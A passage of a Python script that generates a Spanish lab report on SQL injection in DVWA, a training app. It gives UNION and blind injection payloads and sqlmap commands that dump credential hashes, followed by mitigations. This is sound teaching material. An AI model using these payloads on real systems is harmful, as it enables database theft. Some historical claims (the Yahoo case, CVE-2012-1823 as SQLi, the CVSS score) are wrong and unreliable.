         'La aplicación no varía su respuesta, pero el atacante infiere datos por el tiempo que tarda en responder usando SLEEP().',
         'Demoras en la respuesta correlacionadas con condiciones'],
        ['Out-of-band',
         'Los datos se extraen por un canal diferente al HTTP (DNS, SMB). Usado cuando in-band y blind no funcionan.',
         'Tráfico DNS/SMB hacia el servidor del atacante'],
    ]
)
spacer(doc)

body(doc, 'Impacto histórico de SQL Injection:', bold=True)
bullet(doc, 'Yahoo (2012): 3 billones de cuentas comprometidas vía SQLi.',  '')
bullet(doc, 'Sony Pictures (2011): exfiltración masiva de datos mediante inyección SQL.',  '')
bullet(doc, 'RockYou (2009): 32 millones de contraseñas en texto plano expuestas.',  '')
bullet(doc, 'Heartland Payment Systems (2008): 130 millones de tarjetas de crédito robadas.',  '')

spacer(doc)
body(doc, 'Fragmento de código vulnerable (DVWA nivel Low):', bold=True)
code_block(doc,
    "// Concatenación directa — patrón inseguro\n"
    "$id = $_REQUEST['id'];\n"
    "$query = \"SELECT first_name, last_name FROM users WHERE user_id = '$id'\";\n"
    "$result = mysql_query($query);\n"
    "// Problemas: mysql_query() deprecada, sin prepared statements,\n"
    "// sin validación de tipo, mensajes de error MySQL visibles al usuario"
)

# ── DESCRIPCIÓN ──
heading(doc, '1. Descripción de la vulnerabilidad', 2)
body(doc,
    'El módulo SQL Injection de DVWA permite buscar usuarios por ID. '
    'El valor del parámetro id se concatena directamente en la query SQL sin sanitización. '
    'Una comilla simple en el input cierra la cadena de la query, permitiendo al atacante '
    'inyectar SQL arbitrario: filtrar registros, unir tablas mediante UNION SELECT, '
    'leer la base de datos completa o modificar/eliminar datos.',
)

# ── CAUSAS ──
heading(doc, '2. Causas de la vulnerabilidad', 2)
body(doc, 'a. Ausencia de validaciones', bold=True)
body(doc,
    'No se usa mysql_real_escape_string(), PDO con prepared statements ni ninguna '
    'función de parametrización. El input se incluye directamente en la query como cadena.',
)
spacer(doc)
body(doc, 'b. Errores de lógica', bold=True)
body(doc,
    'La aplicación construye la query dinámicamente concatenando strings. '
    'Este patrón es intrínsecamente inseguro porque no separa código (SQL) de datos (input). '
    'La solución arquitectónica es usar consultas preparadas, donde el motor SQL recibe '
    'la estructura de la query y los datos por separado.',
)
spacer(doc)
body(doc, 'c. Manejo inadecuado de entradas y salidas', bold=True)
body(doc,
    'Los mensajes de error de MySQL son visibles al usuario (nivel Low), revelando '
    'estructura de tablas y tipos de datos. La función mysql_query() está deprecada '
    'desde PHP 5.5. El tipo del parámetro id no se valida (debería ser entero).',
)

# ── MECANISMO NORMAL ──
heading(doc, '3. Mecanismo de ataque — SQL Injection Manual', 2)
body(doc, 'Objetivo: extraer todos los usuarios y contraseñas de la base de datos.')
spacer(doc)

body(doc, 'Paso 1 — Confirmar vulnerabilidad:')
code_block(doc, "Input: '\n→ Error: You have an error in your SQL syntax...\nConfirma que el input se interpreta como SQL.")

body(doc, 'Paso 2 — Determinar número de columnas (ORDER BY):')
code_block(doc, "1' ORDER BY 1-- -   → funciona\n1' ORDER BY 2-- -   → funciona\n1' ORDER BY 3-- -   → error\n→ La query retorna 2 columnas.")

body(doc, 'Paso 3 — Identificar columnas visibles (UNION SELECT):')
code_block(doc, "1' UNION SELECT 'a','b'-- -\n→ Ambas columnas son visibles en la respuesta.")

body(doc, 'Paso 4 — Extraer nombre de BD y versión:')
code_block(doc, "1' UNION SELECT database(), version()-- -\n→ dvwa | 5.0.51a-3ubuntu5")
body(doc, '[IMAGEN 8 — UNION SELECT mostrando nombre de BD y versión MySQL — fecha visible]', italic=True)

body(doc, 'Paso 5 — Enumerar tablas:')
code_block(doc, "1' UNION SELECT table_name, NULL FROM information_schema.tables\n   WHERE table_schema=database()-- -\n→ guestbook, users")

body(doc, 'Paso 6 — Extraer columnas de la tabla users:')
code_block(doc, "1' UNION SELECT column_name, NULL FROM information_schema.columns\n   WHERE table_name='users'-- -\n→ user_id, first_name, last_name, user, password, avatar")

body(doc, 'Paso 7 — Volcar credenciales:')
code_block(doc, "1' UNION SELECT user, password FROM users-- -\n\n→ admin   | 5f4dcc3b5aa765d61d8327deb882cf99\n→ gordonb | e99a18c428cb38d5f260853678922e03\n→ pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7\n\nMD5 crackeados: admin=password, pablo=letmein")
body(doc, '[IMAGEN 9 — Extracción completa de tabla users con hashes — fecha visible]', italic=True)

# ── SQLMAP ──
heading(doc, '3b. Ataque automatizado con sqlmap', 2)
body(doc, 'Objetivo: automatizar la extracción completa de la BD.')
spacer(doc)

code_block(doc,
    '# Detectar vulnerabilidad y enumerar bases de datos\n'
    'danielaguirre@kali:~$ sqlmap \\\n'
    '  -u "http://<IP>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \\\n'
    '  --cookie="PHPSESSID=<id>;security=low" \\\n'
    '  --dbs\n\n'
    '# Volcar tabla users (incluye crackeo de hashes MD5 automático)\n'
    'danielaguirre@kali:~$ sqlmap \\\n'
    '  -u "http://<IP>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \\\n'
    '  --cookie="PHPSESSID=<id>;security=low" \\\n'
    '  -D dvwa -T users --dump'
)
body(doc, '[IMAGEN 10 — sqlmap volcando tabla users y crackeando hashes — fecha visible]', italic=True)

# ── BLIND ──
heading(doc, '3c. SQL Injection Blind', 2)
body(doc,
    'La sección SQL Injection (Blind) de DVWA no muestra los datos de la query, '
    'solo responde "User ID exists." o "MISSING". El atacante infiere datos carácter por carácter.',
)
spacer(doc)

body(doc, 'Técnica Boolean-based Blind:')
code_block(doc,
    "-- ¿La primera letra de la BD es 'd'?\n"
    "1' AND SUBSTRING(database(),1,1)='d'-- -   → 'exists' (VERDADERO)\n"
    "1' AND SUBSTRING(database(),1,1)='a'-- -   → 'missing' (FALSO)\n\n"
    "-- Repetir para cada carácter → reconstruye 'dvwa' en 4 peticiones por carácter"
)

body(doc, 'Técnica Time-based Blind:')
code_block(doc,
    "-- Si la condición es verdadera, el servidor tarda 5 segundos\n"
    "1' AND IF(SUBSTRING(database(),1,1)='d', SLEEP(5), 0)-- -"
)

body(doc, 'Automatización con sqlmap (blind):')
code_block(doc,
    'danielaguirre@kali:~$ sqlmap \\\n'
    '  -u "http://<IP>/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \\\n'
    '  --cookie="PHPSESSID=<id>;security=low" \\\n'
    '  --technique=B \\\n'
    '  -D dvwa -T users --dump'
)
body(doc, '[IMAGEN 11 — sqlmap extrayendo datos con técnica boolean-based blind — fecha visible]', italic=True)

add_table(doc,
    ['', 'SQL Injection', 'SQL Injection Blind'],
    [
        ['¿Muestra datos en respuesta?', 'Sí — directamente en pantalla', 'No — solo true/false o tiempo de respuesta'],
        ['Velocidad del ataque',         'Rápida — todos los datos en pocas peticiones', 'Lenta — carácter por carácter'],
        ['Automatización',               'sqlmap sin flags especiales', 'sqlmap --technique=B o T'],
        ['Detectabilidad',               'Alta — muchos errores SQL en logs', 'Baja — peticiones aparentemente normales'],
    ]
)

# ── CLASIFICACIÓN ──
heading(doc, '4. Clasificación técnica', 2)
add_table(doc,
    ['Referencia', 'Detalle'],
    [
        ['CWE-89',      'SQL Injection — neutralización impropia de elementos especiales en comandos SQL'],
        ['CWE-209',     'Generación de mensajes de error con información sensible (MySQL errors visibles)'],
        ['CVE-2012-1823','SQLi crítico en PHP-CGI — ejemplo histórico de impacto masivo'],
        ['OWASP Top 10','A03:2021 – Injection (posición histórica #1)'],
        ['CVSS v4.0',   '~9.8 Critical — extracción completa de BD + posible RCE via INTO OUTFILE'],
    ]
)

# ── IMPACTO ──
heading(doc, '5. Impacto esperado en un sistema real', 2)
add_table(doc,
    ['Dimensión CIA', 'Impacto', 'Justificación'],
    [
        ['Confidencialidad', 'CRÍTICO',
         'Extracción total de la BD: credenciales, datos personales, PII, información financiera.'],
        ['Integridad', 'CRÍTICO',
         'Modificación o eliminación de registros (UPDATE, DELETE, DROP TABLE).'],
        ['Disponibilidad', 'ALTO',
         'DROP DATABASE o SHUTDOWN pueden derribar completamente el sistema.'],
    ]
)

# ── MITIGACIÓN ──
heading(doc, '6. Propuesta de mitigación', 2)
bullet(doc, 'Prepared Statements / consultas parametrizadas — defensa definitiva:',  '')
code_block(doc,
    "$stmt = $pdo->prepare(\"SELECT first_name, last_name FROM users WHERE user_id = ?\");\n"
    "$stmt->execute([$id]);"
)
bullet(doc, 'ORM: frameworks como Eloquent o Doctrine generan queries parametrizadas automáticamente.',  '')
bullet(doc, 'Deshabilitar mensajes de error detallados en producción (display_errors = Off).',  '')
bullet(doc, 'Principio de mínimo privilegio en BD: el usuario de la app sin permisos DROP, CREATE, FILE.',  '')
bullet(doc, 'WAF con reglas anti-SQLi: detectar UNION SELECT, OR 1=1, comentarios SQL, etc.',  '')
bullet(doc, 'Actualizar funciones deprecadas: migrar de mysql_query() a PDO o MySQLi.',  '')

section_divider(doc)
doc.add_page_break()

# ══════════════════════════════════════════════
# REFLEXIÓN PERSONAL
# ══════════════════════════════════════════════
heading(doc, 'Reflexión Personal', 1)
body(doc,
    'A lo largo de este segundo laboratorio, las cuatro vulnerabilidades trabajadas confirman '
    'y profundizan el patrón identificado en el Informe #1: la confianza implícita en el input '
    'del usuario es la causa raíz de la mayoría de vulnerabilidades críticas en aplicaciones web.',
    size=11
)
spacer(doc)
body(doc,
    'Lo que más impresionó durante esta práctica fue la asimetría entre ataque y defensa: '
    'sqlmap extrae la base de datos completa en un solo comando que tarda segundos; '
    'Hydra encuentra la contraseña de admin en segundos contra un formulario sin protección. '
    'Construir esa misma defensa requiere días de trabajo de desarrollo, revisión y prueba.',
    size=11
)
spacer(doc)
body(doc,
    'La diferencia entre SQL Injection y SQL Injection Blind fue un aprendizaje importante: '
    'la ausencia de mensajes de error no implica ausencia de vulnerabilidad. '
    'Un atacante paciente con las herramientas correctas puede extraer cualquier dato bit a bit, '
    'incluso cuando la aplicación aparentemente no da información.',
    size=11
)
spacer(doc)
body(doc,
    'File Inclusion RFI demostró que una sola línea mal configurada en php.ini '
    '(allow_url_include = On) puede convertir una funcionalidad de navegación en un vector '
    'de ejecución remota de código completa. La seguridad del servidor no depende solo del '
    'código de la aplicación, sino también de la configuración del entorno de ejecución.',
    size=11
)
spacer(doc)
body(doc,
    'Desde la perspectiva profesional, estos laboratorios establecen la base práctica para '
    'comprender por qué marcos como OWASP Top 10, controles del NIST CSF y prácticas como '
    'SAST/DAST en pipelines de CI/CD son imprescindibles en cualquier ciclo de desarrollo '
    'de software seguro. La seguridad no puede ser un parche posterior; debe estar '
    'integrada desde el diseño de la arquitectura.',
    size=11
)

spacer(doc)
doc.add_page_break()

# ══════════════════════════════════════════════
# REFERENCIAS
# ══════════════════════════════════════════════
heading(doc, 'Referencias', 1)
numbered(doc, 'OWASP Foundation. (2021). OWASP Top Ten 2021. https://owasp.org/www-project-top-ten/')
numbered(doc, 'MITRE Corporation. (2024). CWE-89: SQL Injection. https://cwe.mitre.org/data/definitions/89.html')
numbered(doc, 'MITRE Corporation. (2024). CWE-78: OS Command Injection. https://cwe.mitre.org/data/definitions/78.html')
numbered(doc, 'MITRE Corporation. (2024). CWE-22: Path Traversal. https://cwe.mitre.org/data/definitions/22.html')
numbered(doc, 'MITRE Corporation. (2024). CWE-307: Improper Restriction of Excessive Authentication Attempts. https://cwe.mitre.org/data/definitions/307.html')
numbered(doc, 'FIRST.org. (2023). Common Vulnerability Scoring System v4.0. https://www.first.org/cvss/v4-0/')
numbered(doc, 'Stuttard, D., & Pinto, M. (2011). The Web Application Hacker\'s Handbook (2.a ed.). Wiley.')
numbered(doc, 'PortSwigger. (2024). SQL Injection. https://portswigger.net/web-security/sql-injection')
numbered(doc, 'PortSwigger. (2024). OS Command Injection. https://portswigger.net/web-security/os-command-injection')
numbered(doc, 'Hydra. (2024). THC-Hydra — Fast Network Login Cracker. https://github.com/vanhauser-thc/thc-hydra')
numbered(doc, 'sqlmap Project. (2024). sqlmap - Automatic SQL injection tool. https://sqlmap.org/')

# ══════════════════════════════════════════════
# GUARDAR
# ══════════════════════════════════════════════
doc.save(OUT)
print(f"✓ Guardado: {OUT}")
